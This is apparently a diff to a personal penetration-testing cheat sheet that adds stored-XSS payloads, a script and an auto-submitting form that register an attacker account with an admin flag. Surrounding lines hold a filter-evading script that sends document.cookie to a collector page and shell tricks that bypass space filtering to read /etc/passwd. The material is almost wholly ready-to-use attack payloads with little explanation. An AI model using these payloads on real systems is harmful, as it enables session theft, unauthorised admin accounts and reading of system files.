@@ -389,6 +389,31 @@ https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec-cheatshe
 <SCRscriptIPT>new Image().src="http://localhost/cookie.php?c="+document.cookie;</SCRscriptIPT>
 #make sure to use html entities
 
+[storred xss: embed register form]
+# 1st method (POST)
+```
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('POST','/gigantic/register.php',true);
+xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
+xhr.onload=function(){
+	console.log(this.responseText);
+}
+
+xhr.send('username=ch4rm&password=password&set_admin=admin&action=Register');
+</script>
+```
+#2nd method (GET)
+```
+<form action="http://172.30.68.55/register.php" name="yo" method="POST">
+<input type="hidden" name="username" id="username" value="ch4rm">
+<input type="hidden" name="password" id="password" value="password">
+<input type="hidden" name="kid" value="ch4rm">
+<input type="hidden" name="set_admin" value="admin">
+</form>
+<script>document.yo.submit();</script>
+```
+
 [bypass space]
 IFS=,;`cat<<<cat,/etc/passwd`
 cat$IFS/etc/passwd
